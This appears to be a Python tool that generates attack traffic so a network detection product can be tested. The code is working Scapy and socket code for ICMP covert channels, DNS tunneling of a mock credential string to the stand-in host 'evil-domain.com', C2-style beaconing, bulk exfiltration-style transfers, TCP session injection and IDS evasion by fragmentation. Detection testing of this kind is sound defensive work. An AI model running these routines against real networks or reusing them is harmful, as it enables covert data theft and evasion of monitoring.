#!/usr/bin/env python3
"""
Advanced Attack Simulation - Tests detection of sophisticated attack patterns
For EDUCATIONAL and AUTHORIZED TESTING purposes only!
"""

import argparse
import time
import random
import socket
import struct
import threading
import base64
import hashlib
from typing import Optional

try:
    from scapy.all import *
    from scapy.layers.inet import IP, TCP, UDP, ICMP
    from scapy.layers.dns import DNS, DNSQR
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False


class AdvancedAttacks:
    """Simulates advanced/sophisticated attack patterns for detection testing"""
    
    def __init__(self, target: str):
        self.target = target
        
    def covert_channel_icmp(self, data: str = "SECRET_DATA", count: int = 50) -> None:
        """
        ICMP Covert Channel - Hides data in ICMP packets
        Detection: Unusual ICMP payload sizes/patterns, data in echo requests
        Severity: HIGH
        """
        print(f"\n[*] Starting ICMP Covert Channel to {self.target}")
        print(f"[*] Data: {data[:20]}...")
        print("[*] Expected Detection: COVERT_CHANNEL / ICMP_TUNNELING")
        
        if not SCAPY_AVAILABLE:
            print("[!] ICMP Covert Channel requires Scapy")
            return
        
        packet_count = 0
        
        # Encode data into ICMP payloads
        encoded_data = base64.b64encode(data.encode()).decode()
        chunks = [encoded_data[i:i+32] for i in range(0, len(encoded_data), 32)]
        
        for _ in range(count):
            try:
                chunk = random.choice(chunks) if chunks else "PING"
                
                # Hide data in ICMP echo request payload
                pkt = IP(dst=self.target)/ICMP(type=8, code=0)/Raw(load=chunk)
                send(pkt, verbose=0)
                packet_count += 1
                
                if packet_count % 10 == 0:
                    print(f"    [COVERT] Sent {packet_count} covert packets...")
                    
                time.sleep(0.2)
            except Exception as e:
                print(f"    [!] Error: {e}")
                break
                
        print(f"[+] ICMP Covert Channel complete - Sent {packet_count} packets")
    
    def dns_tunneling(self, count: int = 50) -> None:
        """
        DNS Tunneling - Encodes data in DNS queries
        Detection: Long subdomains, unusual query patterns, high DNS volume
        Severity: HIGH
        """
        print(f"\n[*] Starting DNS Tunneling simulation")
        print(f"[*] Count: {count} queries")
        print("[*] Expected Detection: DNS_TUNNELING / DNS_EXFILTRATION")
        
        if not SCAPY_AVAILABLE:
            print("[!] DNS Tunneling requires Scapy")
            return
        
        packet_count = 0
        
        # Simulate data exfiltration via DNS
        secret_data = "username=admin&password=secret123&token=abc123xyz"
        
        for _ in range(count):
            try:
                # Encode data as subdomain (base64 chunks)
                chunk = base64.b64encode(
                    secret_data[random.randint(0, len(secret_data)-10):].encode()
                ).decode()[:50].replace('=', '').replace('+', '-').replace('/', '_')
                
                # Create suspicious DNS query
                domain = f"{chunk}.tunnel.evil-domain.com"
                
                pkt = IP(dst="8.8.8.8")/UDP(dport=53)/DNS(
                    rd=1,
                    qd=DNSQR(qname=domain, qtype="TXT")
                )
                
                send(pkt, verbose=0)
                packet_count += 1
                
                if packet_count % 10 == 0:
                    print(f"    [DNS TUNNEL] Sent {packet_count} tunneling queries...")
                    
                time.sleep(0.15)
            except Exception as e:
                print(f"    [!] Error: {e}")
                break
                
        print(f"[+] DNS Tunneling complete - Sent {packet_count} packets")
    
    def beacon_simulation(self, duration: int = 60, interval: int = 5) -> None:
        """
        C2 Beacon Simulation - Regular callback patterns like malware beacons
        Detection: Regular timing patterns, suspicious destinations
        Severity: CRITICAL
        """
        print(f"\n[*] Starting C2 Beacon Simulation to {self.target}")
        print(f"[*] Duration: {duration}s, Interval: ~{interval}s")
        print("[*] Expected Detection: C2_BEACON / MALWARE_CALLBACK")
        
        beacon_count = 0
        start_time = time.time()
        
        while (time.time() - start_time) < duration:
            try:
                # Simulate beacon with slight jitter
                jitter = random.uniform(-1, 1)
                
                # HTTP-like beacon
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                sock.connect((self.target, 80))
                
                # Beacon payload (looks like normal HTTP but has patterns)
                beacon_data = f"GET /api/check?id={hashlib.md5(str(time.time()).encode()).hexdigest()[:8]} HTTP/1.1\r\n"
                beacon_data += f"Host: {self.target}\r\n"
                beacon_data += f"User-Agent: Mozilla/5.0 (compatible; beacon)\r\n"
                beacon_data += f"X-Session: {base64.b64encode(str(beacon_count).encode()).decode()}\r\n"
                beacon_data += "\r\n"
                
                sock.send(beacon_data.encode())
                sock.close()
                beacon_count += 1
                
                print(f"    [BEACON] Callback #{beacon_count} sent")
                
                time.sleep(interval + jitter)
            except Exception as e:
                print(f"    [!] Beacon failed: {e}")
                time.sleep(interval)
                
        print(f"[+] C2 Beacon Simulation complete - {beacon_count} callbacks")
    
    def data_exfiltration(self, size_mb: float = 1.0, chunk_size: int = 1024) -> None:
        """
        Data Exfiltration - Large data transfer simulation
        Detection: Large outbound transfers, unusual data volumes
        Severity: CRITICAL
        """
        print(f"\n[*] Starting Data Exfiltration to {self.target}")
        print(f"[*] Size: {size_mb} MB")
        print("[*] Expected Detection: DATA_EXFILTRATION / LARGE_TRANSFER")
        
        total_bytes = int(size_mb * 1024 * 1024)
        sent_bytes = 0
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((self.target, 80))
            
            # Send data in chunks
            while sent_bytes < total_bytes:
                # Generate "sensitive" looking data
                chunk = b'A' * min(chunk_size, total_bytes - sent_bytes)
                
                try:
                    sock.send(chunk)
                    sent_bytes += len(chunk)
                    
                    if sent_bytes % (100 * 1024) == 0:
                        print(f"    [EXFIL] Sent {sent_bytes // 1024} KB / {total_bytes // 1024} KB")
                except:
                    break
                    
            sock.close()
        except Exception as e:
            print(f"    [!] Error: {e}")
            
        print(f"[+] Data Exfiltration complete - Sent {sent_bytes // 1024} KB")
    
    def port_knocking(self, sequence: list = None) -> None:
        """
        Port Knocking Detection Test - Sends specific port sequence
        Detection: Sequential connection attempts to closed ports
        Severity: MEDIUM
        """
        print(f"\n[*] Starting Port Knocking to {self.target}")
        print("[*] Expected Detection: PORT_KNOCKING / SUSPICIOUS_SEQUENCE")
        
        sequence = sequence or [7000, 8000, 9000, 7000, 8000]
        print(f"[*] Sequence: {sequence}")
        
        for port in sequence:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.5)
                sock.connect_ex((self.target, port))
                sock.close()
                print(f"    [KNOCK] Port {port}")
                time.sleep(0.5)
            except:
                pass
                
        print(f"[+] Port Knocking complete - Sequence: {sequence}")
    
    def session_hijacking_sim(self, count: int = 20) -> None:
        """
        Session Hijacking Simulation - TCP session injection attempts
        Detection: Out-of-sequence packets, invalid ACK numbers
        Severity: CRITICAL
        """
        print(f"\n[*] Starting Session Hijacking Simulation to {self.target}")
        print(f"[*] Count: {count} injection attempts")
        print("[*] Expected Detection: SESSION_HIJACK / TCP_INJECTION")
        
        if not SCAPY_AVAILABLE:
            print("[!] Session Hijacking requires Scapy")
            return
        
        packet_count = 0
        
        for _ in range(count):
            try:
                # Simulate injected packet with guessed sequence numbers
                src_port = random.randint(1024, 65535)
                seq = random.randint(0, 2**32-1)
                ack = random.randint(0, 2**32-1)
                
                # PSH-ACK with injected data
                pkt = IP(dst=self.target)/TCP(
                    sport=src_port,
                    dport=80,
                    flags="PA",
                    seq=seq,
                    ack=ack
                )/Raw(load="GET /admin HTTP/1.1\r\nHost: hijacked\r\n\r\n")
                
                send(pkt, verbose=0)
                packet_count += 1
                
                if packet_count % 5 == 0:
                    print(f"    [HIJACK] Sent {packet_count} injection attempts...")
                    
                time.sleep(0.1)
            except Exception as e:
                print(f"    [!] Error: {e}")
                break
                
        print(f"[+] Session Hijacking Simulation complete - {packet_count} packets")
    
    def malformed_packets(self, count: int = 50) -> None:
        """
        Malformed Packet Attack - Sends intentionally malformed packets
        Detection: Invalid header values, impossible flag combinations
        Severity: MEDIUM
        """
        print(f"\n[*] Starting Malformed Packet Attack to {self.target}")
        print(f"[*] Count: {count} packets")
        print("[*] Expected Detection: MALFORMED_PACKET / PROTOCOL_ANOMALY")
        
        if not SCAPY_AVAILABLE:
            print("[!] Malformed Packets requires Scapy")
            return
        
        packet_count = 0
        
        malformed_types = [
            # Invalid IP header length
            lambda: IP(dst=self.target, ihl=2)/TCP(dport=80),
            # Invalid IP total length
            lambda: IP(dst=self.target, len=10)/TCP(dport=80),
            # All TCP flags set
            lambda: IP(dst=self.target)/TCP(dport=80, flags="FSRPAUEC"),
            # Invalid TCP data offset
            lambda: IP(dst=self.target)/TCP(dport=80, dataofs=1),
            # Reserved flags set
            lambda: IP(dst=self.target)/TCP(dport=80, reserved=7),
            # Zero window with data
            lambda: IP(dst=self.target)/TCP(dport=80, window=0, flags="PA")/Raw(load="data"),
            # Urgent without URG flag
            lambda: IP(dst=self.target)/TCP(dport=80, urgptr=100, flags="A"),
            # Invalid checksum (scapy may fix this)
            lambda: IP(dst=self.target)/TCP(dport=80, chksum=0xFFFF),
        ]
        
        for _ in range(count):
            try:
                pkt_func = random.choice(malformed_types)
                pkt = pkt_func()
                send(pkt, verbose=0)
                packet_count += 1
                
                if packet_count % 10 == 0:
                    print(f"    [MALFORMED] Sent {packet_count} malformed packets...")
                    
                time.sleep(0.05)
            except Exception as e:
                print(f"    [!] Error: {e}")
                
        print(f"[+] Malformed Packet Attack complete - {packet_count} packets")
    
    def evasion_techniques(self, count: int = 30) -> None:
        """
        IDS Evasion Techniques - Tests various evasion methods
        Detection: Fragmentation evasion, TTL manipulation, etc.
        Severity: HIGH
        """
        print(f"\n[*] Starting IDS Evasion Techniques to {self.target}")
        print(f"[*] Count: {count} evasion attempts")
        print("[*] Expected Detection: IDS_EVASION / FRAGMENTATION_EVASION")
        
        if not SCAPY_AVAILABLE:
            print("[!] Evasion Techniques requires Scapy")
            return
        
        packet_count = 0
        
        for _ in range(count):
            try:
                evasion_type = random.choice(["frag", "ttl", "overlap", "tiny"])
                
                if evasion_type == "frag":
                    # Tiny fragment evasion
                    pkt = IP(dst=self.target, flags="MF", frag=0)/TCP(dport=80)/Raw(load="A"*8)
                    pkt2 = IP(dst=self.target, frag=1)/Raw(load="MALICIOUS")
                    send(pkt, verbose=0)
                    send(pkt2, verbose=0)
                    packet_count += 2
                    
                elif evasion_type == "ttl":
                    # TTL manipulation
                    pkt = IP(dst=self.target, ttl=1)/TCP(dport=80, flags="S")
                    send(pkt, verbose=0)
                    packet_count += 1
                    
                elif evasion_type == "overlap":
                    # Overlapping fragments
                    pkt1 = IP(dst=self.target, flags="MF", frag=0)/Raw(load="AAAA")
                    pkt2 = IP(dst=self.target, frag=1)/Raw(load="BBBB")  # Overlaps
                    send(pkt1, verbose=0)
                    send(pkt2, verbose=0)
                    packet_count += 2
                    
                elif evasion_type == "tiny":
                    # Tiny packets
                    pkt = IP(dst=self.target)/TCP(dport=80, flags="S")
                    send(pkt, verbose=0)
                    packet_count += 1
                
                if packet_count % 10 == 0:
                    print(f"    [EVASION] Sent {packet_count} evasion packets...")
                    
                time.sleep(0.1)
            except Exception as e:
                print(f"    [!] Error: {e}")
                
        print(f"[+] IDS Evasion Techniques complete - {packet_count} packets")


def main():
    parser = argparse.ArgumentParser(description="Advanced Attack Simulator")
    parser.add_argument("--target", "-t", default="127.0.0.1", help="Target IP")
    parser.add_argument("--type", "-T", default="covert",
                        choices=["covert", "dns", "beacon", "exfil", "knock", 
                                "hijack", "malformed", "evasion", "all"],
                        help="Attack type")
    parser.add_argument("--duration", "-d", type=int, default=60, help="Duration for timed attacks")
    parser.add_argument("--count", "-c", type=int, default=50, help="Number of packets")
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("  ADVANCED ATTACK SIMULATOR - Detection Testing Tool")
    print("  ⚠️  WARNING: For authorized testing only!")
    print("=" * 60)
    print(f"  Target: {args.target}")
    print(f"  Attack Type: {args.type}")
    print("=" * 60)
    
    adv = AdvancedAttacks(args.target)
    
    try:
        if args.type == "covert" or args.type == "all":
            adv.covert_channel_icmp(count=args.count)
        if args.type == "dns" or args.type == "all":
            adv.dns_tunneling(count=args.count)
        if args.type == "beacon" or args.type == "all":
            adv.beacon_simulation(duration=min(args.duration, 30))
        if args.type == "exfil" or args.type == "all":
            adv.data_exfiltration(size_mb=0.5)
        if args.type == "knock" or args.type == "all":
            adv.port_knocking()
        if args.type == "hijack" or args.type == "all":
            adv.session_hijacking_sim(count=args.count // 2)
        if args.type == "malformed" or args.type == "all":
            adv.malformed_packets(count=args.count)
        if args.type == "evasion" or args.type == "all":
            adv.evasion_techniques(count=args.count // 2)
    except KeyboardInterrupt:
        print("\n[!] Attack interrupted by user")
    
    print("\n[*] Attack simulation complete. Check PacketPeeper for detections!")


if __name__ == "__main__":
    main()
